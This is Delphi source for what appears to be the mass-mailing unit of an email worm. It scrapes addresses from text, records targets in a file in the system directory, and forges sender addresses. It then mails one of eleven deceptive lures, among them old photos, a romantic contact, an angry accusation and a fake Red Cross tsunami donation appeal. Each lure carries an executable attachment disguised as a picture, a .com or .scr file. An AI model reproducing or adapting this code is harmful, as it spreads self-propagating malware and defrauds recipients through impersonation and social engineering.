   unit GetMail;

   interface

   Uses
     Windows, untMailSend, untGoogleSearch;

     Procedure DoGatherText(Text: String);
     Procedure DistrubateMail(Address: String);
     procedure ReadFileStr(Fname:string;var FullContents:string);

   implementation

   function FileExists(const FileName: string): Boolean;
   var
   lpFindFileData: TWin32FindData;
   hFile: Cardinal;
   begin
     hFile := FindFirstFile(PChar(FileName), lpFindFileData);
     if hFile <> INVALID_HANDLE_VALUE then
     begin
       result := True;
       Windows.FindClose(hFile)
     end
     else
       result := False;
   end;

   Function ProceedMail(Address: String): Bool;
   Var
     mailDir       :Array[0..255]Of Char;
     mailStr       :String;
     F             :TextFile;
   Begin
     Result := False;
     GetSystemDirectory(mailDir, 256);
     ReadFileStr(String(mailDir)+'\oooops.ops', mailStr);

     If mailStr <> '' Then
     Begin
       If Pos(Address, mailStr) > 0 Then
         Result := False
       Else
       Begin
         Result := true;
         AssignFile(F, String(mailDir)+'\oooops.ops');
         if FileExists(String(mailDir)+'\oooops.ops') Then
           Append(F)
         Else
           ReWrite(F);
         WriteLn(F, Address);
         CloseFile(F);
       End;
     End Else
     Begin
       Result := True;
       AssignFile(F, String(mailDir)+'\oooops.ops');
       if FileExists(String(mailDir)+'\oooops.ops') Then
         Append(F)
       Else
         ReWrite(F);
       WriteLn(F, Address);
       CloseFile(F);
     End;
   End;

   Procedure DistrubateMail(Address: String);
   Var
     mailFrom      :String;
     mailTo        :String;
     mailSubject   :String;
     mailBody      :String;
     mailFile      :String;
     mailDomain    :String;
     mailDir       :Array[0..255]Of Char;
   Begin
     GetSystemDirectory(mailDir, 256);
     mailTo := Address;

     If Not ProceedMail(mailTo) Then Exit;

     Randomize;
     If MailSearchCnt > 10 Then
     Begin
       mailDomain := MailSearch[(Random(MailSearchCnt-4)+4)-1];
       Delete(mailDomain, 1, 1);
     End Else
     Begin
       Case Random(6) Of
         0: mailDomain := 'hotmail.com';
         1: mailDomain := 'yahoo.com';
         2: mailDomain := 'gmail.com';
         3: mailDomain := 'msn.com';
         4: mailDomain := 'icq.com';
         5: mailDomain := 'lycos.com';
       End;
     End;

     Case Random(11) Of
       0:Begin
           mailFrom := 'mrsPatriks@';
           mailSubject := 'Look what i found :)';
           mailBody := 'I was cleaning my computer, and found these old pictures'#13#10+
                       'of us two together. Check em out :)';
           mailFile := 'link.mx40-runjava.getpic-Picture1.jpg-eof.com';
         End;
       1:Begin
           mailFrom := 'cutedevilgirl@';
           mailSubject := 'Hi! Long time no see :)';
           mailBody := 'I checked my old addressbook, and i found you. Havent talked'#13#10+
                       'for a while. How are you? Check my pic if you dont remember me.';
           mailFile := 'link.mx50-browse_getpic-Me.jpg-eof.com';
         End;
       2:Begin
           mailFrom := 'John_55@';
           mailSubject := 'heh.. whatsup ?';
           mailBody := 'Just wanted to send you this ;) hope you like the picture ;)'#13#10+
                       '(note: adult only, so dont have any kids near :p)';
           mailFile := 'hot-summerparty.jpg-link_getpic.com';
         End;
       3:Begin
           mailFrom := 'Susan_lovexx@';
           mailSubject := 'hi cutie!!!1';
           mailBody := 'Long time no see!!1 :-) :-)'#13#10+
                       'Havent talked to you for a while, hope you still okey. I added'+#13#10+
                       'my picture if you dont remember me (i hope you do tho :-). Write back ;-)';
           mailFile := 'javascript_GETPICTURE-myPicture.jpg-eof.com';
         End;
       4:Begin
           mailFrom := 'gary1@';
           mailSubject := 'What is this? :(';
           mailBody := 'I received a mail from you, with spam. If you know anything about this'#13#10+
                       'please contact me. Ive added a log of your mail :(';
           mailFile := 'mx50-java_getfile-mail-log.txt_eof.com';
         End;
       5:Begin
           mailFrom := 'nils_BMW22@';
           mailSubject := 'haha ;p';
           mailBody := 'hi ;p'#13#10+
                       'check this picture out ;d its hilarious ;D';
           mailFile := 'hahahaha.jpg-GETPICTURE_javascript.com';
         End;
       6:Begin
           mailFrom := 'bobtheman@';
           mailSubject := 'haha :) funny links.';
           mailBody := 'Hi! check these links out :) (no dangerous links.)'#13#10+
                       'funny1 - http://jokes.glowport.com/cartoon/badhair.gif :D hahahaha'#13#10+
                       'funnt2 - http://igloo.its.unimelb.edu.au/funny/backup/saveujob.jpg :D'#13#10+
                       'i hope those where funny :) if so, check the picture i attached ;)';
           mailFile := 'javascript_getpic-FUNNYPIC.JPG-eof.mx40link.com';
         End;
       7:Begin
           mailFrom := 'secretman@';
           mailSubject := '...';
           mailBody := '... testing';
           mailFile := 'testing.com';
         End;
       8:Begin
           mailFrom := 'liisa_jordan2@';
           mailSubject := 'Is this john? i hope it is :)';
           mailBody := 'Hi john!! :-) Long time no see eh?'#13#10+
                       'I added the file you wanted me to give you, tho im not sure its right mail.'#13#10+
                       'If its wrong, please delete this message, and do not open the attached file.';
           mailFile := 'requested.scr';
         End;
       9:Begin
           mailFrom := 'ralf6@';
           mailSubject := 'I will sue you!!!11 :@';
           mailBody := 'Look what you did to my computer!!!!'#13#10+
                       'i will find you, and kick the shit out of you!!.';
           mailFile := 'link.mx40.javascript-getpicture.com';
         End;
      10:Begin
           // ripped this details from some other worm ;p
           mailFrom := 'redcross@';
           mailSubject := 'Tsunami Donation! Please help!';
           mailBody := 'Please help us with your donation and view the attachment below! We need you!'#13#10+
                       'Regards, The Red Cross.';
           mailFile := 'link.tsunami.com';
         End;
     End;

     mailFile := String(mailDir)+'\'+mailFile;
     Randomize;
     If (Random(100) > 80) And (MailFromLstCnt > 10) Then
       mailFrom := MailFromLst[Random(MailFromLstCnt-1)]
     Else
       mailFrom := mailFrom + mailDomain;

     MailSend(mailTo, mailFrom, mailFile, mailSubject, mailBody);
   End;

   procedure ReadFileStr(Fname:string;var FullContents:string);
   var
    Fcontents:File of Char;
    Fbuffer:array [1..1024] of Char;
    rLen,Fsize:LongInt;
   begin
   Try
    FullContents:='';

    If Not FileExists(FName) Then Exit;
    AssignFile(Fcontents,Fname);
    Reset(Fcontents);
    Fsize:=FileSize(Fcontents);
    while not Eof(Fcontents) do begin
     BlockRead(Fcontents,Fbuffer,1024,rLen);
     FullContents:=FullContents + string(Fbuffer);
    end;
    CloseFile(Fcontents);

    if Length(FullContents) > Fsize then
     FullContents:=Copy(FullContents,1,Fsize);
   Except
     ;
   End;
   end;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Procedure DoGatherText(Text: String);
   Var
     Ch            :String;
     Tmp1, Tmp2    :String;
     J             :Integer;
   Begin
     If Pos('@', Text) > 0 Then
     Begin
       Tmp1 := '';
       Tmp2 := '';
       Ch   := '';

       For J := 1 To Length(Text) Do
       Begin
         Ch := Text[J];
         If Pos(LowerCase(Ch), 'abcdefghijklmnopqrstuvwxyz-_0123456789@.') > 0 Then
           Tmp1 := Tmp1 + Ch
         Else
         Begin
           If Pos('@', Tmp1) > 0 Then
           Begin
             If (Tmp1 <> '@') And
                (Tmp1[1] <> '@') And
                (Tmp1[Length(Tmp1)] <> '@') And
                (Pos('.', Tmp1) > 0) Then
                  DistrubateMail(Tmp1);
             Tmp1 := '';
           End Else
             Tmp1 := '';
         End;
       End;
     End;
   End;

   end.
